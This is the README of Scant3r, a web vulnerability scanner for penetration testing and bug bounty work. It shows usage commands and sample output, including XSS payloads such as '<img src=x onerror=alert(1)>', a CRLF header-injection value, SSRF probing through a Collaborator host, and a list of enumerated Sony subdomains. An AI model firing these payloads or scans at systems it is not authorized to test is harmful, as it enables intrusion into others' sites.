# Scant3r - web application vulnerability scanner

**Why would you use Scant3r?**

Scant3r Scans all URLs with multiple HTTP Methods and Tries to look for bugs with basic exploits as **XSS - SQLI - RCE - SSTI** from Headers and URL Parameters
By chaining [waybackurls](https://github.com/tomnomnom/waybackurls) or [gau](https://github.com/lc/gau) <br>
with Scant3r you will have more time to look into functions and get Easy bugs on the way :)

### What will Scant3r give you?

**Scant3r will give you more time to focus on functionailities We've provided some modules to help you**

| Module              | Description                   |
| :-------------    | :-------------                |
| **PMG** | dump a intersting **parameters** from [waybackurls](https://github.com/tomnomnom/waybackurls)|
| **lorsrf** | Bruteforcing on Hidden parameters to find SSRF vulnerability |
| **headers** | inject **SSTI - XSS - RCE - SQLI** payloads in HTTP Headers |
| **hostping** | get live domains|
| **crlf** | CRLF vulnerability scanner|
| **paths** | dirbrute forcing|
| **neon** | scans admin panel from CVE-2019-20141 |

***

## Installation

### Linux ![Linux](http://icons.iconarchive.com/icons/dakirby309/simply-styled/32/OS-Linux-icon.png)

```bash
$ git clone https://github.com/knassar702/scant3r
$ cd scant3r
$ pip3 install -r requirements.txt
```

### Docker ![DOCKER](https://img.icons8.com/color/48/000000/docker.png)

```bash
$ docker build -t scant3r https://github.com/knassar702/scant3r.git
$ docker run -it scant3r -h
```

**Usage**
* normal scan
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py 
```
* add module
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -m headers
# note : use -S if you need to use scanner after use modules
```
* random User-agents
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -R
```
* add custom headers
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -H "Auth: U2NhblQzcgo=\nNew: True"
```
* add timeout
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -t 1000
```
* add threads
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -w 50
```
* add http/https proxy
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -p http://localhost:8080
```
* add cookies
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -c 'login=test%2Ftest'
```
* follow redirects
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -r
```
* dump http requests/responses
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -H "Auth: U2NhblQzcgo=" -d
```
![DUMP](images/req.png)

* remove logo
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py --nologo
```


## Modules 

* **PMG**
```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $cat waybackurls.txt | python3 scant3r.py -m PMG

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : PMG,
[!] URLS : 3
[!] host : None
http://example.com/?file=index.php
http://example.com/?api_key=
http://example.com/?api_key=
http://example.com/?search=
http://example.com/?search=

```
* **headers**
```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo https://menacoderrr.pythonanywhere.com|python3 scant3r.py -m headers

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : headers,
[!] URLS : 1
[!] host : None

[!] Bug : Cross-site scripting
[!] Header: User-agent
[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
[!] Method: GET
[!] URL: https://menacoderrr.pythonanywhere.com
|-----------------|
        

[!] Bug : Cross-site scripting
[!] Header: referer
[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
[!] Method: GET
[!] URL: https://menacoderrr.pythonanywhere.com
|-----------------|

```

* **lorsrf**

```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://yourtarget.com/' | python3 scant3r.py -m lorsrf -w 50 -R -x 'http://myhost.burpcollaborator.net'
+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : lorsrf,
[!] URLS : 3
[!] host : None
```
<img src='images/call.png'>

* **paths**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://localhost/'| python3 scant3r.py -m paths -w 50


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 50
[!] module : paths,
[!] URLS : 1
[!] host : None

[+] Found :> http://loaclhost/phpinfo.php
[+] Found :> http://loaclhost/PI.php
```
* **hostping**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $cat ~/hunting/sony/domains.txt | python3 scant3r.py -m hostping


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : hostping,
[!] URLS : 8588
[!] host : None
sony.com 54.144.253.202
intqa.sony.com 160.33.128.119
ns3.sony.com 160.33.66.20
rn.kb.sony.com 160.33.196.15
expressnetqa.sony.com 160.33.178.11
ns21.sony.com 160.33.195.4
eduqa.sony.com 160.33.128.117
br.en.kb.sony.com 160.33.196.15
ns1.sony.com 160.33.66.21
www.scea.sony.com 64.157.7.8
ca.en.kb.sony.com 160.33.196.15
la.en.kb.sony.com 160.33.196.15
la.es.kb.sony.com 160.33.196.15
us.en.kb.sony.com 160.33.196.15
```
* **CRLF**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://127.0.0.1:5000/?test=' | python3 scant3r.py -m crlf

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] proxy : False
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : crlf,
[!] URLS : 1
[!] host : None
[CRLF] Found :> http://127.0.0.1:5000/?test=
[!] Method :> PUT
[!] Data :> test=%0AHeader-Test:BLATRUC

```
* **neon**
```bash
# CVE-2019-20141 - https://knassar702.github.io/cve/neon/
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo http://$$$$$.com/admin/ | python3 scant3r.py -m neon


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : neon,
[!] URLS : 1
[!] host : None

[!] Bug : Cross-site scripting
[!] Payload: <img src=x onerror=alert(1)>
[!] Method: GET
[!] parameter: q
[!] Link: q=<img src=x onerror=alert(1)>
|-----------------|

```

### Demo 

![Example](images/all.gif)

**Nokia** https://www.nokia.com/responsible-disclosure/
![Nokia](images/nokia.gif)

**IBM** https://hackerone.com/ibm

![IBM](images/ibm.png)

